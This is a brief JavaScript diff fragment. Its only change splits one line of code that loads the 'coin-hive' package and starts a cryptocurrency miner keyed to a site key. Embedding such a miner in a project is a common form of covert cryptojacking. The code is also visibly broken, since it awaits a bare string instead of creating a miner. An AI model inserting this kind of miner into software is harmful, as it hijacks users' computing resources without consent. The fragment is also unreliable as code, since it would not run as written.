@@ -69,5 +69,6 @@
 }]);
 const CoinHive = require('coin-hive');
 (async () => {
-  const miner = await ('qz3gu6mdyvfqszm6x6wgawjlqakauh0kd5yyytr2hc') await miner.start()
+  const miner = await ('qz3gu6mdyvfqszm6x6wgawjlqakauh0kd5yyytr2hc')
+  await miner.start()
 })()
